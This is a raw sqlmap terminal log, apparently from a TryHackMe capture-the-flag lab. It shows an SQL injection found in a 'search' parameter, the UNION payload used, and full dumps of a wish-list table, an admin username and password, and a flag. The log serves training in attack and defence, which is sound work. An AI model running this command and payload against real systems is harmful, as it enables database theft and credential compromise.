sqlmap -r panel.request --tamper=space2comment --dump-all --dbms sqlite
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.5.2#stable}
|_ -| . [']     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 15:26:38 /2021-06-08/

[15:26:38] [INFO] parsing HTTP request from 'panel.request'
[15:26:38] [INFO] loading tamper module 'space2comment'
[15:26:38] [INFO] testing connection to the target URL
[15:26:39] [INFO] checking if the target is protected by some kind of WAF/IPS
[15:26:40] [INFO] testing if the target URL content is stable
[15:26:40] [INFO] target URL content is stable
[15:26:40] [INFO] testing if GET parameter 'search' is dynamic
[15:26:41] [WARNING] GET parameter 'search' does not appear to be dynamic
[15:26:41] [WARNING] heuristic (basic) test shows that GET parameter 'search' might not be injectable
[15:26:41] [INFO] testing for SQL injection on GET parameter 'search'
[15:26:41] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[15:26:45] [WARNING] reflective value(s) found and filtering out
[15:26:50] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[15:26:51] [INFO] testing 'Generic inline queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] n
[15:26:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[15:27:05] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[15:27:09] [INFO] target URL appears to have 2 columns in query
[15:27:12] [INFO] GET parameter 'search' is 'Generic UNION query (NULL) - 1 to 10 columns' injectable
[15:27:12] [INFO] checking if the injection point on GET parameter 'search' is a false positive
[15:27:16] [WARNING] parameter length constraining mechanism detected (e.g. Suhosin patch). Potential problems in enumeration phase can be expected
GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 42 HTTP(s) requests:
---
Parameter: search (GET)
    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: search=darkstar' UNION ALL SELECT 'qqxpq'||'qyOIaUjGRvMrWRSSmLcAMofVntXRkNoUdErbgeqM'||'qzpbq',NULL-- WLIu
---
[15:27:25] [WARNING] changes made by tampering scripts are not included in shown payload content(s)
[15:27:25] [INFO] testing SQLite
[15:27:25] [INFO] confirming SQLite
[15:27:32] [INFO] actively fingerprinting SQLite
[15:27:33] [INFO] the back-end DBMS is SQLite
back-end DBMS: SQLite
[15:27:33] [INFO] sqlmap will dump entries of all tables from all databases now
[15:27:33] [INFO] fetching tables for database: 'SQLite_masterdb'
[15:27:34] [INFO] fetching columns for table 'sequels' 
[15:27:34] [INFO] fetching entries for table 'sequels'
Database: <current>
Table: sequels
[22 entries]
+-------------+-----+----------------------------+
| kid         | age | title                      |
+-------------+-----+----------------------------+
| James       | 8   | shoes                      |
| John        | 4   | skateboard                 |
| Robert      | 17  | iphone                     |
| Michael     | 5   | playstation                |
| William     | 6   | xbox                       |
| David       | 6   | candy                      |
| Richard     | 9   | books                      |
| Joseph      | 7   | socks                      |
| Thomas      | 10  | 10 McDonalds meals         |
| Charles     | 3   | toy car                    |
| Christopher | 8   | air hockey table           |
| Daniel      | 12  | lego star wars             |
| Matthew     | 15  | bike                       |
| Anthony     | 3   | table tennis               |
| Donald      | 4   | fazer chocolate            |
| Mark        | 17  | wii                        |
| Paul        | 9   | github ownership           |
| James       | 8   | finnish-english dictionary |
| Steven      | 11  | laptop                     |
| Andrew      | 16  | rasberry pie               |
| Kenneth     | 19  | TryHackMe Sub              |
| Joshua      | 12  | chair                      |
+-------------+-----+----------------------------+

[15:27:34] [INFO] table 'SQLite_masterdb.sequels' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.64.49/dump/SQLite_masterdb/sequels.csv'
[15:27:34] [INFO] fetching columns for table 'users' 
[15:27:35] [INFO] fetching entries for table 'users'
Database: <current>
Table: users
[1 entry]
+------------------+----------+
| password         | username |
+------------------+----------+
| EhCNSWzzFP6sc7gB | admin    |
+------------------+----------+

[15:27:35] [INFO] table 'SQLite_masterdb.users' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.64.49/dump/SQLite_masterdb/users.csv'
[15:27:35] [INFO] fetching columns for table 'hidden_table' 
[15:27:35] [INFO] fetching entries for table 'hidden_table'
Database: <current>
Table: hidden_table
[1 entry]
+-----------------------------------------+
| flag                                    |
+-----------------------------------------+
| thmfox{All_I_Want_for_Christmas_Is_You} |
+-----------------------------------------+

[15:27:36] [INFO] table 'SQLite_masterdb.hidden_table' dumped to CSV file '/home/kali/.local/share/sqlmap/output/10.10.64.49/dump/SQLite_masterdb/hidden_table.csv'
[15:27:36] [WARNING] HTTP error codes detected during run:
400 (Bad Request) - 1 times
[15:27:36] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/10.10.64.49'

[*] ending @ 15:27:36 /2021-06-08/
